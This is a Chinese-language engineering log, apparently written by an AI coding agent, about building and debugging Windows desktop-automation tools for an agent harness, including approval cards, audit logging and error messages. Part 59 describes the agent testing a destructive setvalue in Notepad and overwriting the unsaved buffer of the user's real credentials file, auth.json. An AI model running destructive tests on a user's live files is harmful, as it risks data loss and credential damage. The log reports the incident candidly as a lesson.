> 的失败串必须一致）之后，再改格式就会当场失败，而不是等到有人关掉 worker 才发现。

---

# 第 57 部分：无名控件的"重新调 inspect"是死路

图标按钮常常既没有名字也没有值。实测一个只有图标、`Text = ''` 的按钮，
inspect 输出是：

```
#2 按钮 · 当前焦点 (330,365,60,60)
```

模型要操作它，就得填 `expect`。填类型名「按钮」→ 被拒：

```
element_mismatch: 编号和名字对不上：#2 是「」，不是「按钮」；重新调 desktop_inspect
```

三个问题：

1. **「是「」」**——名字为空时把空串塞进了引号里。
2. **「重新调 desktop_inspect」是死路**：inspect 也拿不到名字，再调一百次也一样。
   模型只能反复试，每次都要过一次审批。
3. **没说它还能怎么办**：其实 `expect` 留空就好（PS 侧 `if ($null -ne $payload.expect
   -and [string]$payload.expect)` 会跳过核对），指纹已经排除结构变动。

## 修法

报错先确定"那个编号到底是什么"：名字 → 值 → 都没有就承认没有。

```
# 有名字
element_mismatch: 编号和名字对不上：#8 是「记住我」，不是「关闭」；重新调 desktop_inspect
# 只有值
element_mismatch: 编号和名字对不上：#5 是「未命名.txt」，不是「保存」；重新调 desktop_inspect
# 都没有
element_mismatch: 编号和名字对不上：#2 是一个没有名字的控件（按钮）；expect 可以留空，指纹已经说明结构没变
```

顺带把 `是` 后面的空格去掉（之前是 `... 是 「X」`）。

## 收获

> **错误消息里的"下一步"必须真的走得通。** "重新调 inspect"对无名控件是空转；
> 报错给的建议如果注定失败，比不给建议更糟——它会消耗掉用户的一次次审批。

> **报错要说清"那个东西是什么"，而不只是"你错了"。** 名字/值/类型三级回退，
> 才能在任何情况下都说出可辨认的身份。

## 一次差点搞砸的过程

给 `tests/test_tool_activity.py` 加守卫时，我用两次字符串替换往参数化测试里插东西，
两次替换的锚点互相重叠，把 `def test_desktop_action_activity_says_what_it_did`
的定义吞掉了，新测试顶着旧测试的签名跑。pytest 报的是：

```
function uses no argument 'args'
```

教训：**往已有测试文件里插入内容，先看清目标块的边界再整块替换**。连续做两次
"以某个 def 行为锚点"的替换，第二次会命中第一次留下的新文本。这次是收尾时
`git diff` 看出来的——只看 pytest 通过数是发现不了的（24 passed 和 26 passed
我都"觉得"合理）。

---

# 第 58 部分：坐标是四个裸数字，我自己就读错了

`desktop_inspect` 原来这样写一个控件的坐标：

```
  #8 复选框 "记住我" · 未勾选 · 可切换 (125,159,620,23)
```

模型要"按坐标点"时得自己算中心。我查这一块时，顺手按 `(x1,y1,x2,y2)` 算中心：

```python
left, top, right, bottom = item.bounds        # 错
cx, cy = (left + right) // 2, (top + bottom) // 2   # → (372, 91)
```

点下去，焦点落在窗口上——因为 (372,91) 在标题栏里。真实顺序是
`(左, 上, 宽, 高)`（UIA 的 `Rect` 就是这个语义），中心应该是 `(435, 170)`。

## 为什么这是工具的问题，不是我的问题

- 四个同类型的整数，没有任何标签，读者凭什么知道哪个是宽？
- `desktop_windows`/`displays` 里同样的信息写法不同（`2160x1440`），
  唯一没给提示的就是 inspect 这个最常用的输出。
- 想用坐标点，必须先做一次算术；而这个算术的输出没人验证。

## 修法（两处，都很小）

```
  #8 复选框 "记住我" · 未勾选 · 可切换 (125,159 620x23)
...
括号里是「左,上 宽x高」，物理像素，和截图、desktop_action 的 x/y 同一套；
要按坐标点就点 左+宽/2, 上+高/2。
```

- `宽x高` 分组，和 displays 的写法一致；
- 一句说明放在末尾（只在有坐标时出现），把"怎么算中心"直接给出来。

顺带把原来那条"这块屏是 150% 缩放；下面的坐标是物理像素，desktop_action 用同一套"
拆开：缩放只说自己（`这块屏是 150% 缩放。`），坐标口径统一到那一句里。两句话说
同一件事，只会让模型以为它们有区别。

## 顺手验证了 DPI

之前一直没验过"150% 缩放下坐标点击准不准"。按物理像素算出的中心点，点下去焦点
正是那个 CheckBox（`ControlType.CheckBox`），说明 worker 的 DPI 感知与截图/OCR
是同一套坐标空间——这条以前只是文档里的一句"DPIAware 保证坐标空间一致"，现在有
实测支撑。

## 收获

> **输出的格式要让读者不用猜。** 四个裸整数 = 让调用方猜顺序。模型猜错的代价
> 是一次错误的点击，而那可能是"删除"按钮。

> **我自己读错的东西，模型一定也会读错——这是最好的可用性测试。** 排查过程中
> 踩的坑不该只修"我的代码"，该问"输出为什么让人踩坑"。

---

# 第 59 部分：我把用户打开的文件内容换掉了

这是这一轮里最严重的一次事故，记清楚。

## 发生了什么

为了验证"文档控件的写入能力没被探测到"，我启动 `notepad.exe`，然后对一个
ControlType=Document 的控件执行 `setvalue`。我以为那是"刚打开的空记事本"。

实际上：**Windows 记事本会恢复上次的标签页**。它把用户正在编辑的一堆文件全
打开了，其中就有 `D:\codex\auth.json`。我的 `setvalue` 打在了那份文件的编辑
缓冲上，整篇内容被换成了一个短字符串。用户当场发现并质问。

## 破坏范围（查证结果）

```
D:\codex\auth.json   4000 bytes   mtime 2026-10-22 11:46   ← 磁盘文件没被改
记事本窗口标题         *auth.json - Notepad                  ← 编辑缓冲脏了，未保存
```

磁盘上文件完整、JSON 可解析、token 都在——因为记事本没有落盘。这是运气，
不是我的设计。只要当时有一条"自动保存"或者我多敲一个 Ctrl+S，用户就得重新登录。

## 根因有两层

**产品层**：`ValuePattern.SetValue` 在 Document 上是**整篇替换**。一次调用、
没有撤销、没有"这会覆盖整个文件"的提示，而审批卡片上写的只是"控件 #2「...」
写入"。这个动作的破坏力和它呈现的样子完全不匹配。

**我的流程层**：拿真实应用做测试，却没先确认"这个应用里现在开着什么"。
记事本的会话恢复把用户的真实工作文件带了进来，我等于在用户未保存的文档上做
破坏性实验。测试应该永远对着自己能造、能毁的东西做。

## 改了什么（撤回 + 加固）

我先加的"给所有类型探测写入能力"直接撤回——那条改动让 Document 从"能力不
可见"变成"能力可用且不可见"，等于把事故从"点不出来"变成"一点就毁"。

现在是：Document 一律不给 setvalue，明确拒绝并指出正确做法：

```
operation_unsupported: 这是文档控件：写入会整篇替换（覆盖全文，撤不回来）；
改用 action=type 逐字键入
```

同时 `TREE_VALUE_TYPES` 保持不含 Document（全文几 MB 也不该进输出）。

## 收获

> **破坏性和它的呈现要相称。** "填一个输入框"和"覆盖整个文件"在 UIA 里是同一个
> `SetValue`，在用户那里是两件事。工具必须按后者做判断。

> **测试用的真实应用里，可能有用户的真实数据。** 启动一个应用不等于得到一张白纸：
> 记事本会恢复标签页、编辑器会恢复工作区、浏览器会恢复会话。做破坏性验证必须用
> 自己造的目标。

> **运气不是设计。** 这次没落盘只说明"当时没有自动保存"，不能用来安慰自己。

---

# 第 60 部分：让人闭着眼睛批的审批卡

上一节的教训是"破坏性要和呈现相称"。顺着这条线去查"写入"这件事，审批卡上是：

```
桌面操作：按控件操作，目标进程 29076，目标窗口 F1530，控件 #2 「edit-name」，写入，写入 2 个字符
```

两个问题：

1. **「写入，写入 2 个字符」**——动词和补充说明叠在一起，读着像手滑。
2. **看不到要写什么**。而同类的 `action=type` 是显示内容的：

   ```
   操作键鼠，输入 2 个字符，内容：张三
   ```

   同一个"往界面里打字"，一个给看内容、另一个不给，没有任何理由。

## 为什么这不是小事

`setvalue` 打进去的东西可能是文件名、路径、一段命令、一条发给别人的消息。
审批人看到"写入 2 个字符"点同意，等于闭着眼睛批——他不知道自己在放行什么。
审计里不记输入内容是对的（那是长期台账，会被翻出来看），但**审批那一刻必须给**。
两者的区别是：审批是"现在就要决定"，台账是"以后想查"。

## 改法

和 `action=type` 用同一套说法：字数 + 内容开头 80 字。

```
桌面操作：按控件操作，目标进程 29076，目标窗口 F1530，控件 #2 「edit-name」，
写入 2 个字符，内容：张三
```

非写入类操作（点击/切换/滚动）保持原来的短动词，不能变成"点击 0 个字符"。

## 收获

> **"我看到的东西"和"我正在批准的东西"必须是同一件事。** 卡片上少一个内容字段，
> 知情同意就退化成了一次点击。

> **同一个动词在两条路径上要有同一种说法。** `type` 给内容、`setvalue` 不给，用户
> 学不到规律，只能每次重新判断这次给不给看。

---

# 第 61 部分：三处小改动 + 一个不是我的 bug

## 一、无名控件的出路要写在 inspect 里

上一节把"expect 可以留空"写进了**报错**。但那是第二次调用才看到的——模型先撞墙一次，
用户再批一次审批。无名图标按钮在 inspect 输出里本来就看得出来（那行没有引号名字），
所以直接把出路说在前面：

```
expect 填那个控件的名字（审批时会显示给人看，对不上会被拒；没有名字的控件可以不填）
```

## 二、全选撞上空窗（不是我的 bug，但一样会红）

全量跑挂了一条跟桌面无关的用例：

```
assert set() == {'old-one'}
```

`CleanupPickerModal.action_select_all()` 读的是 `self._visible`，而它由 `on_mount`
里的 `_render_rows` 填。测试等的是「屏幕名变成 CleanupPickerModal」——那一步
`on_mount` 可能还没跑。**"弹窗出现"不等于"候选渲染好"**，于是全选等于对空列表全选，
选中集合是空的。

真实用户按不到这个空窗（屏幕没画完他也不会按 Ctrl+A），所以改的是测试的等待条件：
两个条件都到位再按（屏幕名 + `_visible` 非空）。

连跑 5 次稳定，全量恢复绿。

## 收获

> **等待条件要等"我要用的那个东西"，而不是"它所属的容器出现了"。**
> 这和之前那个回合槽的竞态是同一种错：等的是 A 到位，用的是 B。

> **偶发失败先分两类：是"测太早"还是"碰了真实资源"。** 这次是前者，
> 改测试；上次（rules 缓存撞键）是后者，改产品。

---

# 第 62 部分：一条永远做不到的建议（allow_terminal 漏了两个分支）

查"台账能不能回答点在哪儿"时顺手验按键，撞到这件事：

```
操作没做成：terminal_input: 往终端窗口键入等于执行命令；确认窗口后带上 allow_terminal=true 再试
```

照做，还是同一句。原因在 `validate_action`：

| 动作 | 带 allow_terminal |
| --- | --- |
| move | 有 |
| type | 有 |
| scroll | 有 |
| **key** | **没有** |
| **sequence** | **没有** |

而 PS 侧的判定是 `$inputAction = ($payload.action -in @('type','key'))`，序列还要
再看每一步。于是终端窗口里：

- 按一次 `escape` / `enter`：**永远被拒**，提示让人带 `allow_terminal=true`，
  带了也不生效；
- 含 type/key 的序列：同样永远被拒。

这不是绕过了什么防线，是**防线把正确操作也挡住了，还教用户做一件没用的事**。
`enter` 在终端里就是执行命令，所以这道门本身是对的——错的是它没留正确的钥匙孔。

## 改法

`key` 与 `sequence` 两个分支补上 `'allow_terminal': terminal_ok`，与其他动作对齐。

真机验证（用自己的 WinForms 测试窗口，它由 powershell 托管，所以 `is_terminal`
为真，正好落在这道门上）：

```
不带 allow_terminal：terminal_input: …带上 allow_terminal=true 再试
带上 allow_terminal：已完成按键。前台窗口：Harness UI Test Window…
序列带 allow_terminal：已执行 1 个步骤
```

新增守卫：`key` / `type` / `sequence` 三个动作的 payload 都必须原样带上
allow_terminal（True 和 False 两种）。

## 收获

> **凡是错误消息里给出"照这个再做一次"，那条路必须真的通。** 一条做不到的建议
> 比没有建议更坏：用户会反复尝试，最后以为工具坏了。

> **同类参数要逐个动作核对，别只验一个。** 我上一轮验的是 `type`（还验过一个
> 用 `setvalue` 的元素动作），两个都通过，就以为"allow_terminal 通了"。
> 五个动作里漏了两个，最常用的 `key` 恰好在里面。

## 顺带：台账现在记得住"点在哪儿"

`desktop_action` 的审计字段加了 `x` / `y` / `key`。之前只记 `action=click`，
事后没法回答"点在哪"；坐标和键名不是输入内容，没有隐私问题——键入的**文本**
仍然一个字都不记（这条也有实测：`type` 一段"机密内容ABC"，事件里搜不到）。

---

# 第 63 部分：一次"26 个失败"的假警报，和一小时的浪费

这轮我先跑全量，得到：

```
26 failed, 3294 passed, 11 skipped, 14 errors in 338.02s
ERROR tests/test_workspace_diff.py::... subprocess.CalledProcessError:
    Command '['git', 'init', '-q']' returned non-zero exit status 3221225794
```

`3221225794` = `0xC00000E9`？不是，是 `STATUS_DLL_INIT_FAILED`（`0xC0000142`
的十进制写法是 3221225794）。**这是"新进程起不来"**，不是断言失败。

## 判断过程

1. 看失败形态：`git init`、`subprocess.CalledProcessError`、`subprocess.Timeout`……
   **全是"起进程"这一件事**，没有一条是逻辑断言错。
2. 看进程数：405 个，但按名字分组主要是用户自己的应用（Chrome 21、Edge 19、
   ChatGPT 15、Qoder 14……），powershell 只有 3 个。
3. 结论：极可能是这轮连续跑了 10+ 次全量（每次 3~5 分钟、拉起成百上千个子进程）
   把进程/句柄资源用到接近上限。间隔后重跑全绿——**代码没变，观测环境变了**。
   注意这只是相关性：我没有在受控条件下复现"跑很多次 → 起不了进程"，所以
   不要把它当结论，只能当"下次先怀疑这个"。

## 代价

我因为这份报告怀疑了 `test_gateway_sim`（它确实有个真实的等待竞态，顺手修了），
但另外 25 条我花了时间逐条看——全都是同一个原因。

## 教训

> **先看失败的形状，再逐条读。** 26 条失败里 25 条都带 `subprocess` + 一个
> Windows 状态码，那是系统级信号；逐条读是在为同一个根因付 26 次成本。

> **高频率跑全量会污染观测。** 连续跑很多次之后，任何失败都要先问"是不是
> 我刚跑太多"。停一会儿、重跑一次，比逐条读 26 条栈快得多。

重跑（间隔后）结果：**3342 passed / 3 skipped**。

## 顺带修的真问题

`test_restarting_stream_closes_old_reader` 确实有竞态：它 `for _ in range(100)`
等 `responses[0]` 就绪，每次 `wait(0.01)`，总共最多 1 秒——而线程要先把 HTTP
请求发出去才会进 `iter_lines`。满载时 1 秒不够，`responses` 还是空的，于是
`IndexError`。

改成 15 秒 deadline + 明确的失败信息（"流线程在 15 秒内没有发出请求"），
把 IndexError 换成一句能读懂的话。连跑三次稳定。

## 文档纠偏

`DESKTOP_CONTROL_RESEARCH.md` 里"4 个工具，930 行"是**三个月前的快照**，实际
已经是 6 个工具、约 1700 行；`desktop_windows` 标注的"只读，免审批"也是错的
（桌面工具**全部**逐次审批，`approval_class` 故意不给同类免审键）。一并改掉，
并补上 `HARNESS_DESKTOP_CONTROL` 总开关的说明。

---

# 第 64 部分：「没找到」被说成了「已消失」

`desktop_wait` 的 `state='absent'` 分支原来直接返回：

```
等到了：「正在加载」已消失，0.8 秒（轮询 4 次）。
```

但 PS 侧判定"消失"的写法是：

```powershell
$last = Get-UiTree $hwnd $budget.nodes $budget.depth $pollMs
$lastMatch = Find-TreeMatch $last ([string]$payload.text)
$hit = ($null -ne $lastMatch)
if ($wantAbsent) { $hit = (-not $hit) }     # 没找到 = 消失
```

问题在 `$last` 有两种"找不到"：

1. **遍历被截断**。轮询刻意用缩小预算（80 个控件 / 900ms）。控件多的窗口
   （一个 200 行的列表就够）会出现目标没落在前 80 个里 → 返回"没找到" →
   报告"已消失"。（实测用的是自己造的一个 200 按钮窗体；真实应用里 Chrome
   64 个、Edge 30 个，远没到上限。）
2. **`$last` 是 `$null`**（遍历失败、窗口正在关）。`Find-TreeMatch $null` 返回
   `$null` → 同样报告"已消失"。

这不是措辞问题：模型会据此认为"加载框没了"，接着去点被那个加载框挡住的按钮。

## 改法

PS 侧不要再把这类结果压平成"命中"：

```powershell
$absentReadable  = ($null -ne $last)
$absentTruncated = $absentReadable -and [bool]$last.truncated
# 只有"读到了、且没被截断"才算确认它真的不在。
authoritative = ($absentReadable -and (-not $absentTruncated))
```

工具层据此分两种说法：

```
# 确认（遍历完整）
等到了：「正在加载」已消失，0.8 秒（轮询 4 次）。

# 不确认（截断 / 读不到）
「结果」没再出现，0.1 秒（轮询 1 次）。
注意：这次遍历只列出 5 个控件、被截断了，所以「没找到」不等于它不在了；
先用 desktop_inspect 确认一下。
```

真机两态都验了：完整遍历（30 个控件）走"已消失"，把
`HARNESS_DESKTOP_TREE_NODES=5` 之后走对冲文案。

## 收获

> **"阴性结果"的门槛要比"阳性结果"高。** 看到目标 = 它确实在；没看到目标
> 只说明"这次没看见"。把两者写成同一句话，等于让模型在不完整的信息上下判断。

> **压缩预算的地方要重新审一遍判定语义。** 这个 bug 是"把轮询预算从 900ms 收到
> 80 个控件"那次优化的副作用：省下的时间变成了"看起来消失"。

---

# 第 65 部分：验证"那个 bug 到底存不存在"

上一节我报告了 `wait(state='absent')` 会把"没找到"说成"已消失"。这一节专门验证
它是不是真的——**结论：真的存在，可以复现**。

## 造一个必然截断的窗口

一个 WinForms 窗体，`FlowLayoutPanel` 里放 200 个按钮「按钮 0」…「按钮 199」。

```
inspect → 2 个控件、truncated=True
wait(text='按钮 5', state='absent', timeout_ms=600)
      → matched=True（= 等到了「它消失」）
```

而这两个控件确实存在——用另一条完全独立的路子确认：

```powershell
$root.FindFirst(TreeScope::Descendants,
    PropertyCondition(NameProperty, '按钮 5'))    # → EXISTS
```

所以：**控件还在，等待却宣布它消失了**。而且这不是要改环境变量才能触发的边角，
默认配置下就是这样（轮询预算 80 个控件 / 900ms）。

## 修法复核

`authoritative`（读到了、且没被截断）为假时，工具层不写「已消失」，改写成
「没再出现」并说明为什么不算确认。两态都真机验过：

| 场景 | 输出 |
| --- | --- |
| 30 控件、遍历完整 | `等到了：「不存在的控件XYZ」已消失，0.6 秒（轮询 1 次）。` |
| 强制截断（NODES=5） | `「结果」没再出现…注意：这次遍历只列出 5 个控件、被截断了…` |

## 顺带查出来的第二个问题（同一个"说过头"的毛病）

同一个截断窗口里，`inspect` 的收尾话是：

```
可交互控件 2 个（已按上限截断）
这个窗口能读到的控件很少，可能不支持无障碍接口。目标不在上面的话，改用截屏加坐标点击。
```

「可能不支持无障碍接口」是**另一个原因**（走旧式桥的应用）。截断只说明"没读完"，
两件事混在一起，模型会直接放弃控件树。改成据实说：

```
这次遍历被截断了，只列出这么多，不代表窗口里只有这些。
可以调大 HARNESS_DESKTOP_TREE_MS 重试，或用 screen_capture + 坐标点击。
```

### 一句自我纠正

我第一版写的是「再调一次 desktop_inspect 通常就完整了」，因为第一次测到
5887ms/2 个 → 第二次 1022ms/119 个。**加大样本后这个结论不成立**：重跑多次，
这个窗口每次都是 2 个（7.7s / 7.5s / 7.2s），重试并不能变好。

所以文案最后只保留"截断、可调预算、可用截图"这三件已证实的事。
**"看起来像规律的一次观测"不是规律**——写进产品文案前至少要多试几次。

## 没改的东西（查过，不改）

- **`Get-UiTree` 能超过毫秒预算 3 倍**（2.5s → 7.7s）。原因是预算只在两个节点之间
  检查，而单次 `FindAll(Children)` 是个不可中断的跨进程调用（代码里已有注释说明
  PDF 子树 26154 个节点要 30 秒）。要"修"只能把遍历改成可中断的分片调度，代价远大于
  收益，而且真实应用（Chrome 599ms/64、Edge 421ms/30）远在预算内。**记录，不改。**
- 200 个按钮的 WinForms 面板在**前台**时遍历 7.7s、非前台时 0.4s。我怀疑是该应用
  的 UIA provider 在前台重绘时的行为，但没有证据链，不据它改代码。

---

# 第 66 部分：把这一轮的修法自己审一遍

这一节不查产品，查我这几轮的改动——有没有过度防御、有没有说过头。

## 一、抓到一个我自己引入的错

`_action_audit` 里我写了"空值不落盘"：

```python
fields = {k: v for k, v in extra.items() if v not in (None, '', 0)}
```

`0` 被算成空值。于是**点在 (0, 300) 的坐标只落 y，x 直接消失**。台账要回答
"点在哪"，把合法的 0 过滤掉就是记了一条残缺的记录（屏幕边缘、多显示器负坐标
附近很常见）。改成只过滤 `None` 和 `''`，并补了守卫。

> **"空值"是按类型定义的，不是按"看起来没用"定义的。** 0 / False / 空列表
> 各有语义，用一个 `in (None, '', 0)` 一起滤掉，等于用便利换正确。

## 二、一条我写进产品文案、但其实不管用的建议

第 65 节我给截断的窗口写了：

```
可以调大 HARNESS_DESKTOP_TREE_MS 重试
```

实测那个 200 按钮的窗口：默认 2500ms → 2 个控件；调成 20000ms + 400 节点 →
4066ms、**8 个控件，仍然 truncated**。所以这条建议**不成立**。

改成只说确定有效的：

```
这次遍历被截断了，只列出这么多，不代表窗口里只有这些。
目标不在上面的话，用 screen_capture 看一眼再点坐标。
```

这条和我在第 62 节写下的那条原则是同一个东西——"错误消息里给出的下一步必须
真的走得通"。我写原则的时候很清醒，写文案的时候又忘了。

> **凡是"建议用户/模型再做一次"的话，都要亲手试一遍。** 不能因为"听起来合理"
> 就写进去；一个不起作用的建议比不给建议更耗时间。

## 三、审过、认为合理的

| 改动 | 判断 |
| --- | --- |
| `_REFUSAL_CODES` 五类不套失败前缀 | 合理。五个 code 都是"按策略不做"，措辞变化不改变行为 |
| `degraded` 进审计 | 合理，有实测事件（降级成物理点击）支撑 |
| `Document` 禁止 `setvalue` | 偏保守，**但这是有意的取舍**：它是整篇替换、无撤销，误伤的代价远大于"多敲一次 type" |
| 坐标写成 `左,上 宽x高` | 纯改进，无副作用 |
| `key`/`sequence` 补 `allow_terminal` | 修的是"防线挡住正确操作"，不是加防线 |
| 等待 `absent` 的 `authoritative` 对冲 | 只是据实报告，没有新增拦截 |
| `wait` 不再按类型标签匹配 | **是有意的能力收缩**：schema 写的是"名字或值"，按标签匹配会让 `wait('按钮')` 命中任意按钮。口径统一优于多一条模糊匹配 |

## 四、审过、认为说过头的两处文档

1. 第 63 节写"是我连续跑 10+ 次全量把资源用掉了"——这是**相关性不是因果**，
   我没做受控复现。改成"极可能"，并写明"别当结论，只当下次先怀疑这个"。
2. 第 64 节写"Edge、Excel 这类窗口动辄几百个控件"——**没实测过**，我实测的
   只有自己造的 200 按钮窗体（真实应用 Chrome 64 个、Edge 30 个）。改成只说我
   真正测到的东西。

> **文档里的数字和因果都要能指回一次测量。** 写"这类窗口动辄几百个"很顺口，
> 但它会变成下一个人做决策的依据。

---

# 第 67 部分：这一轮自查抓到的四件事

## 一、死代码：一条切窗口的备用路径

`tool_desktop.focus()` 和 `desktop_control_windows.focus_window()` 从来没被注册成
工具——切窗口走的是 `desktop_action(action='focus')`。连带两个审计事件
`desktop_focus` / `desktop_focus_failed`（含中文标签、飞书卡片图标）也永远发不出来。

留着"永远发不出来的审计事件"比死函数更糟：读 `audit.py` 的人会以为存在这条记录。

删掉函数、两个事件、图标和服务于它们的断言；`focus` 的双因子校验改用
`validate_action('focus', ...)` 直接测（那本来就是唯一实现）。

## 二、我自己引入的隐私漏洞：`key` 进台账

上一节我给 `desktop_action` 的审计加了 `key`，理由是"坐标和键名不是输入内容"。
**这个前提是错的**：`key` 允许单字符（`a`、`1`），逐字敲一条密码，台账里就等于
存了密码——而 `type` 的文本一直是"一个字都不记"。

现在单字符键不记录，`enter` / `ctrl+v` / `F5` 照记。

判据只写一处：`desktop_control_windows.is_single_character()`，`_validated_key`
的校验和审计侧共用。两处各写一遍 `len(x)==1 and x.isascii() and x.isalnum()`
迟早会漂——校验放行了、审计却没跳过，漏洞就回来了。

## 三、同一个"四个裸数字"在别处还有三份

上一轮把 `desktop_inspect` 的控件坐标改成 `(左,上 宽x高)`，因为我自己按
`(x1,y1,x2,y2)` 读错过。这次全扫了一遍，还有三处是裸元组：

| 位置 | 原来 | 现在 |
| --- | --- | --- |
| `desktop_snapshot` 的窗口位置 | `位置 90,90,690,630` | `位置 90,90 690x630` |
| `desktop_displays` 的工作区 | `工作区 0,0,2160,1368` | `工作区 0,0 2160x1368` |
| `screen_capture` 的截取区域 | `区域 0,0,200,100` | `区域 0,0 200x100` |

`desktop_displays` 那一行最糟：同一行里屏幕用 `0,0 2160x1440`、工作区用
`0,0,2160,1368`，读者会以为两种写法含义不同。

改 `screen_capture` 时撞到一条测试：

```python
assert '200x100' not in result.text   # 尺寸来自后端，不是请求区域
```

它想验证"尺寸那一行用的是真实图像大小"，改成 `区域 0,0 200x100` 之后这个宽断言
就误伤了。改成精确断言（`尺寸 800x600px` 在、`尺寸 200x100` 不在），并把新格式
也钉住——**放宽断言之前先确认它守的是什么**。

## 四、顺手对齐了过期的验收文档

`docs/FEISHU_ACCEPTANCE.md` 的 D22 / D24 / D26 写的预期文案是几轮之前的措辞
（比如 D24 还在期待"这块屏是 150% 缩放；下面的坐标是物理像素"这句已经被拆开的
话）。照着旧文档验收会判成"没通过"。

## 收获

> **"这不是输入内容"这种判断要按最坏用法想一遍。** 键名听起来无害，但 `key='a'`
> 就是内容。判定标准应该是"它能不能用来重建用户输入"，而不是"它叫不叫 key"。

> **判据只能有一份。** 校验放行、审计跳过，两处都写了同一条规则，就等于给未来
> 留了一个"改一处忘一处"的洞。

> **改输出格式时，先搜一遍这个格式还出现在哪。** 裸元组这一轮找到三处，都是
> 同一个坑；只修被踩到的那一处，下一个人还会踩。

---

# 第 68 部分：端到端跑了一遍"截图 → OCR → 坐标点击"

这一节验证的是我在文档里反复声称的那套坐标契约，顺便看文案有没有漏说。

## 做法

只看自己造的窗口：`screen_capture(region=窗口矩形)` → `screen_ocr` → 按某行的
`@(x,y)` 点击。这样 OCR 只会读到我自己窗口里的字。

## 结果：坐标是对的

```
OCR 认定的复选框中心: (168, 170)
控件声明的位置: (125, 159, 620, 23) → 中心 (435, 170)
点击后焦点: 记住我 | ControlType.CheckBox
```

y 完全一致（170）；x 不同是因为 OCR 给的是**文字**中心，「记住我」三个字本身就在
这一行的左侧——两者都落在复选框那一行里，点下去都命中。这说明
`screen_capture` 的 origin、OCR 的 bbox 偏移、`desktop_action` 的坐标空间确实是同一套。

## 抓到一处漏说

OCR 的开头写着：

```
每行的 @(x,y) 是该行中心点的屏幕坐标，可以直接给 desktop_action 当 x/y 用
```

「可以直接当 x/y 用」只说了一半：`desktop_action` 还**必须**带 `expected_pid` 与
`expected_window_id`，否则直接回「缺少 expected_pid；它来自 desktop_snapshot」。
模型照着这句话写第一个调用就会吃一次拒绝。

补上：

```
可以直接给 desktop_action 当 x/y 用（它还要 expected_pid 与 expected_window_id，
从 desktop_snapshot 或 desktop_inspect 拿）
```

## 一个观察（没有改）

OCR 把中文按字拆开并加空格：

```
囗 记 亻 主 我      ← 「记住我」，「住」还被认成了「亻主」
```

所以"拿控件名去 OCR 结果里搜"通常搜不到。这不是 bug（模型读得懂这行字，坐标也是
对的），但如果以后要做「按名字自动点」，就必须先解决这件事。**记录，不改。**

## 一个偶发失败的测试（记录，未定位）

全量跑里 `test_harness_app.py::test_checkpoint_gc_reports_other_sessions` 挂过一次：
断言 `len(current.list()) == 3` 得到 2。单跑 4/4 通过，重跑全量也通过。

它跟本轮的改动无关（`/checkpoint-gc` 路径没碰过）。已知的可能来源：三个 `begin_turn`
在同一秒内生成 id（`cp_<时间>_<4位hex>`），或者满载时索引写入与读取的时序。**没有
证据就不动它**——按之前那条规矩：偶发失败先分清"测太早/碰了真实资源/资源不足"，
再决定改哪儿。

---

# 第 69 部分：两个"数字是对的，但会被人读错"的地方

## 一、窗口等待超时时报的可见窗口数是被过滤后的

`Wait-ForWindow` 里 `$lastCount = $windows.Count` 取的是**过滤之后**的列表：
`target=foreground` 只留前台那一个，带 `expected_pid` 时只留那个进程的窗口。

于是超时提示：

```
0.6 秒内没等到标题含「保存」的窗口出现。当前可见窗口 0 个；
可以 desktop_windows 看看都有什么。
```

桌面明明有 18 个窗口，却说 0 个。模型据此会认为桌面是空的、甚至怀疑工具坏了。

改法：超时路径补一次全量枚举（只在超时跑一次，~40ms），回 `windows_total`，
文案按需分成两句：

```
当前可见窗口 18 个，其中符合条件（pid / 前台）的 0 个；
```

没过滤时只说一个数字，不多半句。真机验证：18 / 0。

## 二、`list_windows(limit=1)` 的标题会被读成"只有 1 个窗口"

```
可见窗口 1 个（共 18 个）：
```

括号里的"共 18"没能说明白是被 `limit` 截断——读起来像"看到 1 个、另有 17 个是
别的东西"。和 `desktop_inspect` 的"（已按上限截断）"是同一种信息，写法却不一样：

```
可见窗口 18 个，下面是前 1 个（limit=1）：
```

## 收获

> **诊断信息里的数字要说清"它统计的是哪一批"。** `windows=0` 在有过滤条件时是
> 正确计算、错误表达——模型没法从数字本身反推出过滤规则。

> **"截断"和"总共"是两件事，一个括号装不下。** 同一个信息在不同工具里要用同一
> 种说法，否则读者得为每个工具重新学一遍。

## 一个仍然存在、但不动的不一致

`desktop_wait` 的窗口目标是「可见顶层窗口」——窗口被最小化就会从列表里消失，于是
`state='absent'` 会报"窗口已消失"。严格说它只是不可见了。

没改：这个目标的名字就叫 window（可见窗口），对"等对话框关掉"这类真实用途没有影响；
加一句对冲只会让最常见的那条路径变啰嗦，属于过度防御。
